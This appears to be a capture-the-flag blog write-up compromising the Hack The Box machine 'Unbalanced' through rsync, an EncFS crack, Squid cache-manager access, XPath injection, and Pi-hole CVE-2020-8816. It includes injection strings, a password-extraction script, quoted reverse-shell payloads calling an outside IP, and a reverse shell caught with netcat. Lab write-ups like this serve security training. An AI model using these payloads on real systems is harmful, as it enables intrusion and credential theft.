---
layout: secret_post
title: "HTB Unbalanced"
date: 2020-08-12 00:30
categories: [writeups, hackthebox, linux]
author: dr3amda3mon
key: "6HrNX81SE9mBkmNY$oIh9jCV496j4WOURXy"
---

this was one of the most fun boxes ive pwned to date

```
10.10.10.200
```

start adding the IP and unbalanced.htb to `/etc/hosts`
and scanning the target with `nmap`

## nmap

```
> nmap -sV -sC -p- -Pn -oN nmap/full unbalanced.htb
# Nmap 7.80 scan initiated Sun Aug  9 13:37:39 2020 as: nmap -sV -sC -p- -Pn -oN nmap/full unbalanced.htb
Nmap scan report for unbalanced.htb (10.10.10.200)
Host is up (0.023s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a2:76:5c:b0:88:6f:9e:62:e8:83:51:e7:cf:bf:2d:f2 (RSA)
|   256 d0:65:fb:f6:3e:11:b1:d6:e6:f7:5e:c0:15:0c:0a:77 (ECDSA)
|_  256 5e:2b:93:59:1d:49:28:8d:43:2c:c1:f7:e3:37:0f:83 (ED25519)
873/tcp  open  rsync      (protocol version 31)
3128/tcp open  http-proxy Squid http proxy 4.6
|_http-server-header: squid/4.6
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  9 13:38:08 2020 -- 1 IP address (1 host up) scanned in 29.02 seconds
```
---
## enumeration

okay, so there are three services running: `ssh`, `rsync` (super versatile utility used for remote and local file syncs and backups), and `squid` proxy (robust web proxy cache server application)

lets see if we can read anything from rsync

```bash
> rsync -a rsync://unbalanced.htb:873
conf_backups    EncFS-encrypted configuration backups
```

there appears to be an `encfs` encrypted backup folder residing on the machine

if we can list its contents we might be able to pull down the directory

```bash
> rsync -av rsync://unbalanced.htb/conf_backups conf_backups
```
```
ls -la conf_backups/
total 632
drwxr-xr-x 2 elliot elliot   4096 Apr  4 11:05 .
drwxr-xr-x 5 elliot elliot   4096 Aug 12 00:19 ..
-rw-r--r-- 1 elliot elliot    154 Apr  4 11:05 0K72OfkNRRx3-f0Y6eQKwnjn
-rw-r--r-- 1 elliot elliot     56 Apr  4 11:05 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
-rw-r--r-- 1 elliot elliot    190 Apr  4 11:05 2VyeljxHWrDX37La6FhUGIJS
-rw-r--r-- 1 elliot elliot    537 Apr  4 11:05 3cdBkrRF7R5bYe1ZJ0KYy786
-rw-r--r-- 1 elliot elliot    386 Apr  4 11:05 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
-rw-r--r-- 1 elliot elliot    560 Apr  4 11:05 3xB4vSQH-HKVcOMQIs02Qb9,
-rw-r--r-- 1 elliot elliot    275 Apr  4 11:05 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
-rw-r--r-- 1 elliot elliot    463 Apr  4 11:05 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
-rw-r--r-- 1 elliot elliot   2169 Apr  4 11:05 5FTRnQDoLdRfOEPkrhM2L29P
-rw-r--r-- 1 elliot elliot    238 Apr  4 11:05 5IUA28wOw0wwBs8rP5xjkFSs
-rw-r--r-- 1 elliot elliot   1277 Apr  4 11:05 6R1rXixtFRQ5c9ScY8MBQ1Rg
-rw-r--r-- 1 elliot elliot    108 Apr  4 11:05 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
-rw-r--r-- 1 elliot elliot   1339 Apr  4 11:05 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
-rw-r--r-- 1 elliot elliot   1050 Apr  4 11:05 8CBL-MBKTDMgB6AT2nfWfq-e
-rw-r--r-- 1 elliot elliot     29 Apr  4 11:05 8e6TAzw0xs2LVxgohuXHhWjM
-rw-r--r-- 1 elliot elliot    152 Apr  4 11:05 8XDA,IOhFFlhh120yl54Q0da
-rw-r--r-- 1 elliot elliot   5721 Apr  4 11:05 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
-rw-r--r-- 1 elliot elliot   2980 Apr  4 11:05 A4qOD1nvqe9JgKnslwk1sUzO
-rw-r--r-- 1 elliot elliot   1138 Apr  4 11:05 a4zdmLrBYDC24s9Z59y-Pwa2
-rw-r--r-- 1 elliot elliot    443 Apr  4 11:05 Acv0PEQX8vs-KdK307QNHaiF
-rw-r--r-- 1 elliot elliot    935 Apr  4 11:05 B6J5M3OP0X7W25ITnaZX753T
-rw-r--r-- 1 elliot elliot   3643 Apr  4 11:05 c9w3APbCYWfWLsq7NFOdjQpA
-rw-r--r-- 1 elliot elliot    288 Apr  4 11:05 ,CBjPJW4EGlcqwZW4nmVqBA6
-rw-r--r-- 1 elliot elliot   1521 Apr  4 11:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
-rw-r--r-- 1 elliot elliot    332 Apr  4 11:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
-rw-r--r-- 1 elliot elliot   2592 Apr  4 11:05 dF2GU58wFl3x5R7aDE6QEnDj
-rw-r--r-- 1 elliot elliot   1268 Apr  4 11:05 dNTEvgsjgG6lKBr8ev8Dw,p7
-rw-r--r-- 1 elliot elliot   2359 Apr  4 11:05 ECXONXBBRwhb5tYOIcjjFZzh
-rw-r--r-- 1 elliot elliot   1297 Apr  2 09:06 .encfs6.xml
```

looks like a lot of encrypted files

fortunately, `.encfs6.xml` is included, which contains the hash key we will crack and use to decrypt the backup with `encfs2john.py`
```bash
> sudo /opt/JohnTheRipper/run/encfs2john.py conf_backups/ > encfs6.xml.john
> sudo john --wordlist:/opt/rockyou.txt encfs6.xml.john
```
the password we get is `bubblegum`

now we can proceed with decryption

```bash
> sudo encfs /home/elliot/ctf/htb/unbalanced/conf_backups/ /conf_d/
```

after combing through its contents one by one, `squid.conf` stood out

we can print out every uncommented line to dig into the configuration

```bash
> cat squid.conf |grep -v ^\#|grep .

acl localnet src 0.0.0.1-0.255.255.255  # RFC 1122 "this" network (LAN)
acl localnet src 10.0.0.0/8             # RFC 1918 local private network (LAN)
acl localnet src 100.64.0.0/10          # RFC 6598 shared address space (CGN)
acl localnet src 169.254.0.0/16         # RFC 3927 link-local (directly plugged) machines
acl localnet src 172.16.0.0/12          # RFC 1918 local private network (LAN)
acl localnet src 192.168.0.0/16         # RFC 1918 local private network (LAN)
acl localnet src fc00::/7               # RFC 4193 local private network range
acl localnet src fe80::/10              # RFC 4291 link-local (directly plugged) machines

acl SSL_ports port 443
acl Safe_ports port 80          # http
acl Safe_ports port 21          # ftp
acl Safe_ports port 443         # https
acl Safe_ports port 70          # gopher
acl Safe_ports port 210         # wais
acl Safe_ports port 1025-65535  # unregistered ports
acl Safe_ports port 280         # http-mgmt
acl Safe_ports port 488         # gss-http
acl Safe_ports port 591         # filemaker
acl Safe_ports port 777         # multiling http
acl CONNECT method CONNECT

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow manager
include /etc/squid/conf.d/*
http_access allow localhost
acl intranet dstdomain -n intranet.unbalanced.htb
acl intranet_net dst -n 172.16.0.0/12
http_access allow intranet
http_access allow intranet_net
http_access deny all
http_port 3128

coredump_dir /var/spool/squid
refresh_pattern ^ftp:           1440    20%     10080
refresh_pattern ^gopher:        1440    0%      1440
refresh_pattern -i (/cgi-bin/|\?) 0     0%      0
refresh_pattern .               0       20%     4320

cachemgr_passwd T******1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
cachemgr_passwd disable all
cache disable
```
it appears that we have enumerated some hosts, subnets, subdomain, access control lists, and a `cachemgr` password

according to the ACL `http_access`, we are allowed to access the class B local subnet `172.16.0.0/12` and the subdomain `intranet.unbalanced.htb`, which we can add to `/etc/hosts`

while googling, i stumbled upon this article `https://wiki.squid-cache.org/Features/CacheManager` and found this:
```
http://mycache.example.com:3128/squid-internal-mgr/info
```
so lets try to access the page on the newly found subdomain

i receive a "URL could not be retrieved" error, which means there may be a potential vector we can take advantage of

since the config file contains a plaintext password for accessing the squid cache manager, we will start by using `squidclient` (preinstalled on Kali) and the menu command to list its contents

```bash
> squidclient -h 10.10.10.200 -w 'T******1' mgr:menu

HTTP/1.1 200 OK
Server: squid/4.6
Mime-Version: 1.0
Date: Sun, 09 Aug 2020 19:37:12 GMT
Content-Type: text/plain;charset=utf-8
Expires: Sun, 09 Aug 2020 19:37:12 GMT
Last-Modified: Sun, 09 Aug 2020 19:37:12 GMT
X-Cache: MISS from unbalanced
X-Cache-Lookup: MISS from unbalanced:3128
Via: 1.1 unbalanced (squid/4.6)
Connection: close

 index                  Cache Manager Interface                 disabled
 menu                   Cache Manager Menu                      protected
 offline_toggle         Toggle offline_mode setting             disabled
 shutdown               Shut Down the Squid Process             disabled
 reconfigure            Reconfigure Squid                       disabled
 rotate                 Rotate Squid Logs                       disabled
 pconn                  Persistent Connection Utilization Histograms    protected
 mem                    Memory Utilization                      protected
 diskd                  DISKD Stats                             protected
 squidaio_counts        Async IO Function Counters              disabled
 config                 Current Squid Configuration             disabled
 client_list            Cache Client List                       disabled
 comm_epoll_incoming    comm_incoming() stats                   disabled
 ipcache                IP Cache Stats and Contents             disabled
 fqdncache              FQDN Cache Stats and Contents           protected
```
focusing on the `protected` commands as listed in `squid.conf`, the `fqdncache` seems the most logical one to start with

we can by slightly altering the above command

```bash
> squidclient -h 10.10.10.200 -w 'T******1' mgr:fqdncache

FQDN Cache Contents:

Address                                       Flg TTL Cnt Hostnames
127.0.1.1                                       H -001   2 unbalanced.htb unbalanced
::1                                             H -001   3 localhost ip6-localhost ip6-loopback
172.31.179.2                                    H -001   1 intranet-host2.unbalanced.htb
172.31.179.3                                    H -001   1 intranet-host3.unbalanced.htb
10.10.14.43                                    N  035   0
127.0.0.1                                       H -001   1 localhost
172.17.0.1                                      H -001   1 intranet.unbalanced.htb
ff02::1                                         H -001   1 ip6-allnodes
ff02::2                                         H -001   1 ip6-allrouters
```

oh sweet, we found some subdomains residing on the subnet we found earlier, and if i were to guess, they look to be part of some load balancing set up, yet i do not see `intranet-host1.unbalanced.htb` which i can infer is at `172.31.179.1`

we can use curl to scrape some information from it

keep in mind that we will have to specify the proxy to route through to access the local subnet

```
> curl -x http://10.10.10.200:3128 http://172.31.179.1

Host temporarily taken out of load balancing for security maintenance.
```
we seem to be met with a custom maintenance message which alludes to the presence of an unpatched security issue(s)?

lets run `gobuster` to find files and directories, making sure to specify the proxy

```bash
> gobuster dir -p http://10.10.10.200:3128 -u http://172.31.179.1 -w /opt/SecLists/Discovery/Web-Content/common.txt -x xml,php -b 404
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://172.31.179.1
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://10.10.10.200:3128
[+] User Agent:              gobuster/3.0.1
[+] Extensions:              xml,php
[+] Timeout:                 10s
===============================================================
2020/08/13 02:04:52 Starting gobuster
===============================================================
/css (Status: 301)
/employees.xml (Status: 403)
/index.php (Status: 200)
/index.php (Status: 200)
/intranet.php (Status: 200)
===============================================================
2020/08/13 02:05:23 Finished
===============================================================

```

`intranet.php` looks interesting... so lets try to access it (remember to configure your browser to proxy through 10.10.10.200:3128, i use foxyproxy)



## X-Path Injection

we can see that there is an employee login section
after backtracking a step i noticed that there was a Forbidden `/employees.xml` file gobuster found

i though that maybe the login is vulnerable to some `xpath` injection

```
' or 1=1 or 'a'='a
```

and voila, it works

```
Rita Fubelli

rita@unbalanced.htb

Role: HR Manager
------

Jim Mickelson

jim@unbalanced.htb

Role: Web Designer
------

Bryan Angstrom

bryan@unbalanced.htb

Role: System Administrator
------

Sarah Goodman

sarah@unbalanced.htb

Role: Team Leader
```

lets focus on the sysadmin

i set up my burp user options by adding the squid proxy as an upstream proxy
and use default firefox proxy settings to point to burp

then i enter the xpath injection into the field

```
'or substring(Password,1,1)='p' or'
```


## Bruteforcing

rita's password seems to start with 'p', so we have demonstrated that this route will work


now, we can use `burp` to do some slow bruteforcing, but i will write a script instead

```py
import requests

url = 'http://172.31.179.1/intranet.php'
proxy = 'http://10.10.10.200:3128'
words = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&?"
users = ['rita','jim','bryan','sarah']

for user in users:
	try:
		data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password,0,1)='x"}
		request = requests.post(url, data=data, proxies={'http':proxy})
		b = len(request.text)
		passwd = ''
		for i in range(1,80):
			found = False
			for c in words:
				data = {'Username': '', 'Password': "' or Username='" + user + "' and substring(Password," + str(i) + ",1)='" + c + ""}
				request = requests.post(url, data=data, proxies={'http':proxy})
				if len(request.text) != b:
					found = True
					break

			if not found:
				break
			passwd += c

	except KeyboardInterrupt:
				pass		
	print(user + ":" + cracked_pass)
```
and in under a minute after running it we have all their creds

```
rita:p*********!
jim:s*************n
bryan:i********************!
sarah:s********h
```

none of them were useful on the intranet login
but the password for `bryan` worked for `ssh`

## Initial Foothold

```bash
ssh bryan@10.10.10.200
```
here we can read `user.txt`

```
1671b0f12fbdc4222b04f3f7f4575cf5
```

since we have managed to abuse the intranet lets switch our focus towards privesc

after enumerating a bit i found a `TODO` file containing reminders

```bash
bryan@unbalanced:~$ cat TODO
############
# Intranet #
############
* Install new intranet-host3 docker [DONE]
* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
* Test intranet-host3 [DONE]
* Add intranet-host3 to load balancer [DONE]
* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
* Fix intranet-host2 [DONE]
* Re-add intranet-host2 to load balancer (set default weight) [DONE]
- Fix intranet-host1 [TODO]
- Re-add intranet-host1 to load balancer (set default weight) [TODO]

###########
# Pi-hole #
###########
* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
* Set temporary admin password [DONE]
* Create Pi-hole configuration script [IN PROGRESS]
- Run Pi-hole configuration script [TODO]
- Expose Pi-hole ports to the network [TODO]

```
and it appears that bryan had installed Pi-hole locally, set up a temporary `admin` password,
and created a pihole config script that he has yet to finish, which most likely points to a vulnerability

after running `linpeas` i found an IP address distinguishable from the rest

```
172.31.179.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:03 STALE
10.10.10.2 dev ens160 lladdr 00:50:56:b9:7e:aa REACHABLE
172.31.179.2 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:02 STALE
172.31.179.1 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:b3:01 STALE
--------------------------------------------------------------
172.31.11.3 dev br-742fc4eb92b1 lladdr 02:42:ac:1f:0b:03 STALE <---
--------------------------------------------------------------
fe80::250:56ff:feb9:7eaa dev ens160 lladdr 00:50:56:b9:7e:aa router STALE
```
so now we have an IP and a reason to go after `Pi-hole` as a potential exploitation route

the question is, is the current version vulnerable in some way, and how do we access it locally?

lets scrape the new IP for info

```bash
> curl 172.31.11.3

<html><head>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
        <link rel='stylesheet' href='/pihole/blockingpage.css' type='text/css'/>
    </head><body id='splashpage'><img src='/admin/img/logo.svg'/><br/>Pi-<b>hole</b>: Your black hole for Internet advertisements<br><a href='/admin'>Did you mean to go to the admin panel?</a></body></html>
```

we found the Pi-hole dashboard `/admin` page!
`pihole.unbalanced.htb`

after we turn on our proxy again the page loads and are able to login with default creds (password is `admin`)

OOF!

navigating to `Settings` we can see the web-based UI version

```
FTL version:	v4.3.1
```

lets research any potential vulns

## Pi-hole version 4.3.2 RCE

this article demonstrates an RCE vuln for version 4.3.2 and earlier

`https://natedotred.wordpress.com/2020/03/28/cve-2020-8816-pi-hole-remote-code-execution/`

the analysis points to improper input validation when configuring Pi-hole's built-in DHCP server...

```
	From there, users can define static DHCP leases to pin an IP address to a given MAC address.

	When processing user input in the form of MAC addresses, the application does not adequately validate nor validate this input before reusing it in a shell command.
```

this can lead to executing arbitrary code by tampering with the supplied MAC addr (aaaaaaaaaaaa)...

```
	aaaaaaaaaaaa&&W=${PATH#/???/}&&P=${W%%?????:*}&&X=${PATH#/???/??}&&H=${X%%???:*}&&Z=${PATH#*:/??}&&R=${Z%%/*}&&$P$H$P$IFS-$R$IFS’EXEC(HEX2BIN(“706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27”));’&&
```

the article follows up with a snippet of the code that causes this vuln (source:`https://github.com/pi-hole/AdminLTE/blob/master/scripts/pi-hole/php/savesettings.php`)

```php
<?php
/* Pi-hole: A black hole for Internet advertisements
*  (c) 2017 Pi-hole, LLC (https://pi-hole.net)
*  Network-wide ad blocking via your own hardware.
*
*  This file is copyright under the latest version of the EUPL.
*  Please see LICENSE file for your rights under this license. */

if(basename($_SERVER['SCRIPT_FILENAME']) !== "settings.php")
{
    die("Direct access to this script is forbidden!");
}

//[...]

function validMAC($mac_addr)
{
  // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case)
  return (preg_match('/([a-fA-F0-9]{2}[:]?){6}/', $mac_addr) == 1);
}


//[...]

    // Read available adlists
    $adlist = readAdlists();
    // Read available DNS server list
    $DNSserverslist = readDNSserversList();

    $error = "";
    $success = "";

    if(isset($_POST["field"]))
    {
        // Handle CSRF
        check_csrf(isset($_POST["token"]) ? $_POST["token"] : "");

        // Process request
        switch ($_POST["field"]) {

//[...]

            case "DHCP":

                if(isset($_POST["addstatic"]))
                {
                    $mac = $_POST["AddMAC"];
                    $ip = $_POST["AddIP"];
                    $hostname = $_POST["AddHostname"];

                    if(!validMAC($mac))
                    {
                        $error .= "MAC address (".htmlspecialchars($mac).") is invalid!<br>";
                    }
                    $mac = strtoupper($mac);

                    if(!validIP($ip) && strlen($ip) > 0)
                    {
                        $error .= "IP address (".htmlspecialchars($ip).") is invalid!<br>";
                    }

                    if(!validDomain($hostname) && strlen($hostname) > 0)
                    {
                        $error .= "Host name (".htmlspecialchars($hostname).") is invalid!<br>";
                    }

                    if(strlen($hostname) == 0 && strlen($ip) == 0)
                    {
                        $error .= "You can not omit both the IP address and the host name!<br>";
                    }

                    if(strlen($hostname) == 0)
                        $hostname = "nohost";

                    if(strlen($ip) == 0)
                        $ip = "noip";

                    // Test if this lease is already included
                    readStaticLeasesFile();
                    foreach($dhcp_static_leases as $lease) {
                        if($lease["hwaddr"] === $mac)
                        {
                            $error .= "Static release for MAC address (".htmlspecialchars($mac).") already defined!<br>";
                            break;
                        }
                        if($ip !== "noip" && $lease["IP"] === $ip)
                        {
                            $error .= "Static lease for IP address (".htmlspecialchars($ip).") already defined!<br>";
                            break;
                        }
                        if($lease["host"] === $hostname)
                        {
                            $error .= "Static lease for hostname (".htmlspecialchars($hostname).") already defined!<br>";
                            break;
                        }
                    }

                    if(!strlen($error))
                    {
                        exec("sudo pihole -a addstaticdhcp ".$mac." ".$ip." ".$hostname);
                        $success .= "A new static address has been added";
                    }
                    break;
                }

                if(isset($_POST["removestatic"]))
                {
                    $mac = $_POST["removestatic"];
                    if(!validMAC($mac))
                    {
                        $error .= "MAC address (".htmlspecialchars($mac).") is invalid!<br>";
                    }
                    $mac = strtoupper($mac);

                    if(!strlen($error))
                    {
                        exec("sudo pihole -a removestaticdhcp ".$mac);
                        $success .= "The static address with MAC address ".htmlspecialchars($mac)." has been removed";
                    }
                    break;
                }



//[...]

            default:
                // Option not found
                $debug = true;
                break;
        }
    }

//[...]
```
what makes exploitation difficult is that the user input is capitalized through a call to `strtoupper`, meaning no lower case
character can be used in injection

here's an example of what the typical injection would look like:

```php
	aaaaaaaaaaaa&&php -r ‘$sock=fsockopen(“10.1.0.9”,2256);exec(“/bin/sh -i <&3 >&3 2>&3”);’
```

this means our injection would be capitalized, so we can use environment variables instead to overcome this pitfall by appending `$PATH` to a MAC address on a new static DHCP lease...

```
aaaaaaaaaaaa$PATH
```

which displays...

```
/opt/pihole:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
the lower-case characters "p", "h", and "r" is all we need to write "php -r"

okay so without digging any further i find an exploit for `CVE-2020-8816`
`https://github.com/AndreyRainchik/CVE-2020-8816/`

python isnt installed in the container and cant run it remotely, so i port forward Pi-hole through SSH and run it locally

```bash
> ssh -NL 8080:127.0.0.1:8080 bryan@10.10.10.200
```
then i spin up a listener on port `9999` to get a reverse shell after running the exploit...

```bash
> python3 holeinpi.py http://127.0.0.1:8080 admin 10.10.14.9 9999     

Attempting to verify if Pi-hole version is vulnerable                                               
Logging in...                                                                                       
Login succeeded                                                                                     
Grabbing CSRF token
Attempting to read $PATH
Pihole is vulnerable and served's $PATH allows PHP
Sending payload
```

```bash
> nc -lnvp 9999

listening on [any] 9999 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.200] 60140
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we are now user `www-data`

## Elevate to root

and we can read `/root`? oh shit!
it contains the files `ph_install.sh` and `pihole_config.sh`

```sh
$ cd /root
$ ls
ph_install.sh
pihole_config.sh
$ cat pihole_config.sh |more
#!/bin/bash                                                                                         

# Add domains to whitelist                                                                          
/usr/local/bin/pihole -w unbalanced.htb                                                             
/usr/local/bin/pihole -w rebalanced.htb                                                             

# Set temperature unit to Celsius                                                                   
/usr/local/bin/pihole -a -c                                                                         

# Add local host record
/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1

# Set privacy level
/usr/local/bin/pihole -a -l 4

# Set web admin interface password
/usr/local/bin/pihole -a -p 'b******************!'

# Set admin email
/usr/local/bin/pihole -a email admin@unbalanced.htb
```
the config script inside `/root` contains the admin user creds and email

now we can `su` to root from the SSH connection to bryan?!

```sh
> su root
root@unbalanced:~# id
uid=0(root) gid=0(root) groups=0(root)
root@unbalanced:~# ls
root.txt
root@unbalanced:~# cat root.txt
ddf0e9d13394b9866e7b125a30b1d0d7
```
